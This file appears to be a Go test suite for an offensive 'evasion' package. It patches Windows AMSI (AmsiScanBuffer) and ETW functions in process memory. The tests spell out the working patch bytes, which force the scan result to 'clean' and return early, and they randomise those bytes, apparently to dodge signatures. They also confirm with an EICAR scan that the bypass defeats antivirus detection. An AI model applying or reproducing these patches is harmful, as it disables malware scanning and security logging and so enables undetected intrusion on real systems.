//go:build windows && amd64

package securityctl

import (
	"syscall"
	"testing"
	"unsafe"

	"dark-arts/pkg/evasion"
)

const (
	amsiResultClean    = 0x00000000 // AMSI_RESULT_CLEAN
	amsiResultDetected = 0x00000001 // AMSI_RESULT_DETECTED
)

var (
	modAMSI             = syscall.NewLazyDLL("amsi.dll")
	procAmsiInitialize  = modAMSI.NewProc("AmsiInitialize")
	procAmsiOpenSession = modAMSI.NewProc("AmsiOpenSession")
	procAmsiScanBuffer  = modAMSI.NewProc("AmsiScanBuffer")
	procAmsiCloseSession = modAMSI.NewProc("AmsiCloseSession")
	procAmsiUninitialize = modAMSI.NewProc("AmsiUninitialize")
)

func TestAMSIControl_FullLifecycle(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if s := a.Status(); s != StatusInitialized {
		t.Errorf("after Initialize: status = %v, want StatusInitialized", s)
	}
	if err := a.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	if s := a.Status(); s != StatusEnabled {
		t.Errorf("after Enable: status = %v, want StatusEnabled", s)
	}
	if err := a.Disable(); err != nil {
		t.Fatalf("Disable() = %v", err)
	}
	if s := a.Status(); s != StatusDisabled {
		t.Errorf("after Disable: status = %v, want StatusDisabled", s)
	}
	a.Restore()
}

func TestETWControl_FullLifecycle(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	e := NewETWControl()
	if err := e.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if s := e.Status(); s != StatusInitialized {
		t.Errorf("after Initialize: status = %v, want StatusInitialized", s)
	}
	if err := e.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	if s := e.Status(); s != StatusEnabled {
		t.Errorf("after Enable: status = %v, want StatusEnabled", s)
	}
	if err := e.Disable(); err != nil {
		t.Fatalf("Disable() = %v", err)
	}
	if s := e.Status(); s != StatusDisabled {
		t.Errorf("after Disable: status = %v, want StatusDisabled", s)
	}
	e.Restore()
}

func TestAMSIControl_PatchIntegrity(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if a.fp == nil {
		t.Fatal("fp is nil after Initialize")
	}
	orig := make([]byte, len(a.fp.orig))
	copy(orig, a.fp.orig)
	if err := a.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	if err := a.Disable(); err != nil {
		t.Fatalf("Disable() = %v", err)
	}
	// Read actual bytes from the function's address in memory — not from
	// fp.orig, which is merely the saved copy. This verifies that
	// restorePatch actually wrote the original bytes back.
	live := make([]byte, len(orig))
	for i := range live {
		live[i] = *(*byte)(unsafe.Add(toPtr(a.fp.addr), i))
	}
	for i, b := range live {
		if b != orig[i] {
			t.Fatalf("live byte %d: got %02x, want %02x after restore (restorePatch may have failed)", i, b, orig[i])
		}
	}
}

func TestETWControl_PatchIntegrity(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	e := NewETWControl()
	if err := e.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if e.fp == nil {
		t.Fatal("fp is nil after Initialize")
	}
	orig := make([]byte, len(e.fp.orig))
	copy(orig, e.fp.orig)
	if err := e.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	if err := e.Disable(); err != nil {
		t.Fatalf("Disable() = %v", err)
	}
	// Read actual bytes from the function's address in memory.
	live := make([]byte, len(orig))
	for i := range live {
		live[i] = *(*byte)(unsafe.Add(toPtr(e.fp.addr), i))
	}
	for i, b := range live {
		if b != orig[i] {
			t.Fatalf("live byte %d: got %02x, want %02x after restore (restorePatch may have failed)", i, b, orig[i])
		}
	}
}

func TestAMSIControl_RestoreIsIdempotent(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if err := a.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	a.Restore()
	a.Restore()
}

func TestETWControl_RestoreIsIdempotent(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	e := NewETWControl()
	if err := e.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if err := e.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	e.Restore()
	e.Restore()
}

// loadedModuleBase returns the base address of an already-loaded module.
func loadedModuleBase(dllName string) uintptr {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	getHandle := k32.NewProc("GetModuleHandleW")
	namePtr, _ := syscall.UTF16PtrFromString(dllName)
	h, _, _ := getHandle.Call(uintptr(unsafe.Pointer(namePtr)))
	return h
}

func TestAMSIControl_TargetsLoadedModule(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if a.fp == nil {
		t.Fatal("fp is nil after Initialize")
	}
	base := loadedModuleBase("amsi.dll")
	if base == 0 {
		t.Skip("amsi.dll not loaded")
	}
	nt := unsafe.Add(toPtr(base), uintptr(*(*uint32)(unsafe.Add(toPtr(base), 0x3C))))
	opt := unsafe.Add(nt, 0x18)
	sizeOfImage := uintptr(*(*uint32)(unsafe.Add(opt, 0x38)))
	if a.fp.addr < base || a.fp.addr >= base+sizeOfImage {
		t.Errorf("AMSI function addr 0x%X is outside loaded amsi.dll range [0x%X, 0x%X)",
			a.fp.addr, base, base+sizeOfImage)
	}
}

func TestETWControl_TargetsLoadedModule(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	e := NewETWControl()
	if err := e.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if e.fp == nil {
		t.Fatal("fp is nil after Initialize")
	}
	base := loadedModuleBase("ntdll.dll")
	if base == 0 {
		t.Skip("ntdll.dll not loaded")
	}
	nt := unsafe.Add(toPtr(base), uintptr(*(*uint32)(unsafe.Add(toPtr(base), 0x3C))))
	opt := unsafe.Add(nt, 0x18)
	sizeOfImage := uintptr(*(*uint32)(unsafe.Add(opt, 0x38)))
	if e.fp.addr < base || e.fp.addr >= base+sizeOfImage {
		t.Errorf("ETW function addr 0x%X is outside loaded ntdll.dll range [0x%X, 0x%X)",
			e.fp.addr, base, base+sizeOfImage)
	}
}

func TestAMSIControl_PatchVisibleAfterEnable(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if err := a.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	defer a.Disable()
	// The patch starts with:
	//   48 8B 44 24 30   mov rax, [rsp+0x30]   (load result pointer)
	//   C7 00 00 00 00 00 mov [rax], 0          (*result = 0)
	live := make([]byte, 11)
	for i := 0; i < 11; i++ {
		live[i] = *(*byte)(unsafe.Add(toPtr(a.fp.addr), i))
	}
	if live[0] != 0x48 || live[1] != 0x8B || live[2] != 0x44 || live[3] != 0x24 || live[4] != 0x30 {
		t.Errorf("patch does not start with mov rax,[rsp+0x30] at 0x%X: %02X %02X %02X %02X %02X", a.fp.addr, live[0], live[1], live[2], live[3], live[4])
	}
	if live[5] != 0xC7 || live[6] != 0x00 {
		t.Errorf("bytes 5..6 not mov [rax],0: %02X %02X", live[5], live[6])
	}
	if live[7] != 0x00 || live[8] != 0x00 || live[9] != 0x00 || live[10] != 0x00 {
		t.Errorf("mov [rax] immediate is not zero: %02X %02X %02X %02X", live[7], live[8], live[9], live[10])
	}
}

func TestAMSIControl_ApplyPatchRefusesIfBytesChanged(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	// Corrupt the saved original bytes so they no longer match what's
	// actually at the function address. applyPatch validates that the
	// current live bytes match fp.orig before writing — this should fail.
	a.fp.orig[0] ^= 0xFF
	err := a.Enable()
	if err == nil {
		t.Errorf("Enable() with corrupted orig should have refused, got nil")
	}
	if s := a.Status(); s != StatusDisabled {
		t.Errorf("status after failed Enable = %v, want StatusDisabled", s)
	}
}

func TestAMSIControl_RestoreSkipsIfAlreadyUnpatched(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if err := a.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	// Read the byte that should be patched.
	patchedByte := *(*byte)(unsafe.Add(toPtr(a.fp.addr), 0))

	// Corrupt fp.patch so restorePatch won't recognize the live bytes
	// as "our patch". It should skip the write entirely.
	a.fp.patch[0] ^= 0xFF
	if err := a.Disable(); err != nil {
		t.Fatalf("Disable() = %v", err)
	}

	// The byte at the function address should still be the patched value,
	// NOT the original — restorePatch should have been a no-op.
	liveAfter := *(*byte)(unsafe.Add(toPtr(a.fp.addr), 0))
	if liveAfter != patchedByte {
		t.Errorf("restorePatch should have skipped but byte changed: got %02X, want %02X (patched value)", liveAfter, patchedByte)
	}
}

func TestRandomAmsiPatchBytes_Contract(t *testing.T) {
	seen := make(map[byte]bool)
	for i := 0; i < 1000; i++ {
		patch := randomAmsiPatchBytes()
		// Bytes 0..4: 48 8B 44 24 30 = mov rax, [rsp+0x30]
		if patch[0] != 0x48 || patch[1] != 0x8B || patch[2] != 0x44 || patch[3] != 0x24 || patch[4] != 0x30 {
			t.Fatalf("bytes 0..4 not mov rax,[rsp+0x30]: %02X %02X %02X %02X %02X", patch[0], patch[1], patch[2], patch[3], patch[4])
		}
		// Bytes 5..10: C7 00 00 00 00 00 = mov dword ptr [rax], 0
		if patch[5] != 0xC7 || patch[6] != 0x00 {
			t.Fatalf("bytes 5..6 not mov [rax],0: %02X %02X", patch[5], patch[6])
		}
		if patch[7] != 0x00 || patch[8] != 0x00 || patch[9] != 0x00 || patch[10] != 0x00 {
			t.Fatalf("mov [rax] immediate is not zero: %02X %02X %02X %02X", patch[7], patch[8], patch[9], patch[10])
		}
		// Bytes 11..N must be a valid zeroing instruction.
		switch patch[11] {
		case 0x33:
			if patch[12] != 0xC0 {
				t.Fatalf("invalid xor eax,eax: %02X %02X", patch[11], patch[12])
			}
		case 0x31:
			if patch[12] != 0xC0 {
				t.Fatalf("invalid xor eax,eax: %02X %02X", patch[11], patch[12])
			}
		case 0x29:
			if patch[12] != 0xC0 {
				t.Fatalf("invalid sub eax,eax: %02X %02X", patch[11], patch[12])
			}
		case 0x48:
			if patch[12] != 0x31 || patch[13] != 0xC0 {
				t.Fatalf("invalid xor rax,rax: %02X %02X %02X", patch[11], patch[12], patch[13])
			}
		default:
			t.Fatalf("unexpected zeroing opcode at offset 11: %02X", patch[11])
		}
		retIdx := -1
		for j := 11; j < len(patch); j++ {
			if patch[j] == 0xC3 {
				retIdx = j
				break
			}
		}
		zeroLen := 2
		if patch[11] == 0x48 {
			zeroLen = 3
		}
		expectedRet := 11 + zeroLen
		if retIdx != expectedRet {
			t.Fatalf("ret at index %d, want %d", retIdx, expectedRet)
		}
		seen[patch[11]] = true
	}
	if len(seen) < 4 {
		t.Errorf("only %d unique zeroing variants seen in 1000 iterations: %v", len(seen), seen)
	}
}

func TestRandomEtwPatchBytes_Contract(t *testing.T) {
	seen := make(map[byte]bool)
	for i := 0; i < 1000; i++ {
		patch := randomEtwPatchBytes()
		// ETW patch must NOT touch R9 — first byte must be a zeroing
		// instruction, not 0x41 (REX.B prefix for R9).
		if patch[0] == 0x41 {
			t.Fatalf("ETW patch incorrectly starts with REX.B prefix (R9 access): %02X %02X %02X", patch[0], patch[1], patch[2])
		}
		// First instruction must be a valid zeroing opcode.
		switch patch[0] {
		case 0x33:
			if patch[1] != 0xC0 {
				t.Fatalf("invalid xor eax,eax: %02X %02X", patch[0], patch[1])
			}
		case 0x31:
			if patch[1] != 0xC0 {
				t.Fatalf("invalid xor eax,eax: %02X %02X", patch[0], patch[1])
			}
		case 0x29:
			if patch[1] != 0xC0 {
				t.Fatalf("invalid sub eax,eax: %02X %02X", patch[0], patch[1])
			}
		case 0x48:
			if patch[1] != 0x31 || patch[2] != 0xC0 {
				t.Fatalf("invalid xor rax,rax: %02X %02X %02X", patch[0], patch[1], patch[2])
			}
		default:
			t.Fatalf("unexpected zeroing opcode: %02X", patch[0])
		}
		// Ret must follow the zeroing instruction.
		retIdx := -1
		for j := 0; j < len(patch); j++ {
			if patch[j] == 0xC3 {
				retIdx = j
				break
			}
		}
		zeroLen := 2
		if patch[0] == 0x48 {
			zeroLen = 3
		}
		if retIdx != zeroLen {
			t.Fatalf("ret at index %d, want %d", retIdx, zeroLen)
		}
		seen[patch[0]] = true
	}
	if len(seen) < 4 {
		t.Errorf("only %d unique zeroing variants seen in 1000 iterations: %v", len(seen), seen)
	}
}

func TestAMSIControl_DoubleEnableIsIdempotent(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if err := a.Enable(); err != nil {
		t.Fatalf("Enable() #1 = %v", err)
	}
	if s := a.Status(); s != StatusEnabled {
		t.Errorf("after Enable #1: status = %v, want StatusEnabled", s)
	}
	// Second Enable should be a no-op (idempotent), not an error.
	if err := a.Enable(); err != nil {
		t.Errorf("Enable() #2 = %v (want nil for idempotent call)", err)
	}
	if s := a.Status(); s != StatusEnabled {
		t.Errorf("after Enable #2: status = %v, want StatusEnabled", s)
	}
	// Verify function is still correctly patched.
	live := *(*byte)(unsafe.Add(toPtr(a.fp.addr), 0))
	if live != a.fp.patch[0] {
		t.Errorf("function byte 0 = %02X, want %02X (patch)", live, a.fp.patch[0])
	}
	a.Disable()
}

func TestAMSIControl_DoubleDisableIsIdempotent(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if err := a.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	if err := a.Disable(); err != nil {
		t.Fatalf("Disable() #1 = %v", err)
	}
	if s := a.Status(); s != StatusDisabled {
		t.Errorf("after Disable #1: status = %v, want StatusDisabled", s)
	}
	// Second Disable should be harmless (idempotent).
	if err := a.Disable(); err != nil {
		t.Errorf("Disable() #2 = %v (want nil for idempotent call)", err)
	}
	if s := a.Status(); s != StatusDisabled {
		t.Errorf("after Disable #2: status = %v, want StatusDisabled", s)
	}
}

func TestAMSIControl_ExternalModificationPreserved(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if err := a.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	// Simulate another component modifying the function after we patched
	// it (e.g., another security tool hooking the same function).
	// We can't write to the RX page directly, but we can test the
	// restorePatch logic by corrupting fp.patch so it doesn't match
	// the live bytes. restorePatch should skip (preserve the external
	// modification) rather than blindly overwrite.
	a.fp.patch[0] ^= 0xFF
	if err := a.Disable(); err != nil {
		t.Fatalf("Disable() = %v", err)
	}
	// The byte at the function address should NOT have been changed
	// by our restorePatch (it should have been a no-op).
	// We can't easily verify the exact byte without knowing what the
	// "external" modification was, but we can verify Disable succeeded.
	if s := a.Status(); s != StatusDisabled {
		t.Errorf("status = %v, want StatusDisabled", s)
	}
}

func TestETWControl_DoubleEnableIsIdempotent(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	e := NewETWControl()
	if err := e.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if err := e.Enable(); err != nil {
		t.Fatalf("Enable() #1 = %v", err)
	}
	if err := e.Enable(); err != nil {
		t.Errorf("Enable() #2 = %v (want nil for idempotent call)", err)
	}
	if s := e.Status(); s != StatusEnabled {
		t.Errorf("after Enable #2: status = %v, want StatusEnabled", s)
	}
	e.Disable()
}

func TestETWControl_DoubleDisableIsIdempotent(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}
	e := NewETWControl()
	if err := e.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if err := e.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	if err := e.Disable(); err != nil {
		t.Fatalf("Disable() #1 = %v", err)
	}
	if err := e.Disable(); err != nil {
		t.Errorf("Disable() #2 = %v (want nil for idempotent call)", err)
	}
	if s := e.Status(); s != StatusDisabled {
		t.Errorf("after Disable #2: status = %v, want StatusDisabled", s)
	}
}

// amsiScan is a crash-safe wrapper around AmsiScanBuffer. AMSI calls from
// Go test binaries can crash non-deterministically if the AMSI subsystem
// is not fully initialized for this process context.
//
// AmsiScanBuffer has 6 parameters. On x64, the first 4 go in registers
// and the last 2 go on the stack:
//
//	RCX  = amsiContext
//	RDX  = buffer
//	R8   = length
//	R9   = contentName
//	[RSP+28h] = amsiSession
//	[RSP+30h] = AMSI_RESULT *result
type amsiScanResult struct {
	HRESULT uint32
	Result  uint32
	Crashed bool
}

func amsiScan(ctx, session uintptr, buf []byte, name string) (res amsiScanResult) {
	contentName, _ := syscall.UTF16PtrFromString(name)
	func() {
		defer func() {
			if r := recover(); r != nil {
				res.Crashed = true
			}
		}()
		r1, _, _ := procAmsiScanBuffer.Call(
			ctx,                             // RCX: HAMSICONTEXT
			uintptr(unsafe.Pointer(&buf[0])), // RDX: buffer
			uintptr(len(buf)),               // R8:  length
			uintptr(unsafe.Pointer(contentName)), // R9:  contentName
			session,                         // [RSP+28h]: amsiSession
			uintptr(unsafe.Pointer(&res.Result)), // [RSP+30h]: result
		)
		res.HRESULT = uint32(r1)
	}()
	return
}

// TestAMSIControl_FunctionalContract verifies that patching AmsiScanBuffer
// actually changes the function's behavior: detection before patching,
// bypass after patching, detection again after restore. Uses EICAR as
// the test payload. Skips gracefully if AMSI is not functional in the
// test binary process context.
func TestAMSIControl_FunctionalContract(t *testing.T) {
	if err := evasion.Init(); err != nil {
		t.Skipf("evasion init failed: %v", err)
	}

	var ctx uintptr
	appName, _ := syscall.UTF16PtrFromString("DarkArtsTest")
	r1, _, _ := procAmsiInitialize.Call(
		uintptr(unsafe.Pointer(appName)),
		uintptr(unsafe.Pointer(&ctx)),
	)
	if r1 != 0 {
		t.Skipf("AmsiInitialize failed: 0x%X (AMSI unavailable)", r1)
	}
	defer procAmsiUninitialize.Call(ctx)

	var session uintptr
	r1, _, _ = procAmsiOpenSession.Call(ctx, uintptr(unsafe.Pointer(&session)))
	if r1 != 0 {
		t.Skipf("AmsiOpenSession failed: 0x%X", r1)
	}
	defer procAmsiCloseSession.Call(ctx, session)

	eicar := []byte("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")

	// --- BEFORE PATCH: verify AMSI detects EICAR ---
	pre := amsiScan(ctx, session, eicar, "eicar.txt")
	if pre.Crashed {
		t.Skip("AmsiScanBuffer crashed before patch — AMSI not functional in this process")
	}
	if pre.HRESULT != 0 {
		t.Skipf("AmsiScanBuffer returned HRESULT 0x%X — AV not active or AMSI not inspecting this binary", pre.HRESULT)
	}
	t.Logf("before patch: result=%d", pre.Result)
	if pre.Result != amsiResultDetected {
		t.Skipf("AmsiScanBuffer returned %d for EICAR (expected %d=DETECTED) — AMSI not inspecting this process", pre.Result, amsiResultDetected)
	}

	// --- APPLY PATCH ---
	a := NewAMSIControl()
	if err := a.Initialize(); err != nil {
		t.Fatalf("Initialize() = %v", err)
	}
	if err := a.Enable(); err != nil {
		t.Fatalf("Enable() = %v", err)
	}
	defer a.Disable()

	// --- AFTER PATCH: AmsiScanBuffer should return S_OK (bypass) ---
	post := amsiScan(ctx, session, eicar, "eicar.txt")
	if post.Crashed {
		t.Skip("AmsiScanBuffer crashed after patch — cannot verify bypass")
	}
	t.Logf("after patch: HRESULT=0x%X, result=%d", post.HRESULT, post.Result)
	if post.HRESULT != 0 {
		t.Errorf("AmsiScanBuffer returned HRESULT 0x%X after patch (expected S_OK)", post.HRESULT)
	}
	if post.Result != amsiResultClean {
		t.Errorf("AmsiScanBuffer returned result=%d after patch (expected %d=CLEAN)", post.Result, amsiResultClean)
	}

	// --- RESTORE ---
	a.Disable()

	// --- AFTER RESTORE: AmsiScanBuffer should detect again ---
	rst := amsiScan(ctx, session, eicar, "eicar.txt")
	if rst.Crashed {
		t.Skip("AmsiScanBuffer crashed after restore — cannot verify restore")
	}
	t.Logf("after restore: HRESULT=0x%X, result=%d", rst.HRESULT, rst.Result)
	if rst.HRESULT != 0 {
		t.Errorf("AmsiScanBuffer returned HRESULT 0x%X after restore", rst.HRESULT)
	}
	if rst.Result != amsiResultDetected {
		t.Errorf("after restore: result=%d (expected %d=DETECTED) — prologue may not have been correctly restored", rst.Result, amsiResultDetected)
	}
}
